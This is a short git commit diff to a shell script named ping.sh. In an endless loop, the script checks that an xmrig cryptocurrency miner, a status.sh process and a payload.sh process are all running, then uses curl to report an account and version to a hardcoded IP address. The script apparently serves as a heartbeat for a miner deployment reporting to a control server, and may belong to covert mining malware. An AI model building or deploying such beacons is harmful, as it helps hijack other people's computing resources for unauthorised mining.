07ada2ae5de6f797ef5dba7ea21b84258bc8cd95
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-10 01:38:50 -0300

    Update ping.sh

--- ping.sh
+++ ping.sh
@@ -2,7 +2,9 @@
 
 while true
 do
-   if pgrep xmrig > /dev/null
+   if pgrep xmrig > /dev/null && 
+      pgrep status.sh > /dev/null && 
+      pgrep payload.sh > /dev/null
    then
        url='http://135.148.11.148/ping.php?account='$1'&version='$2
        curl $url
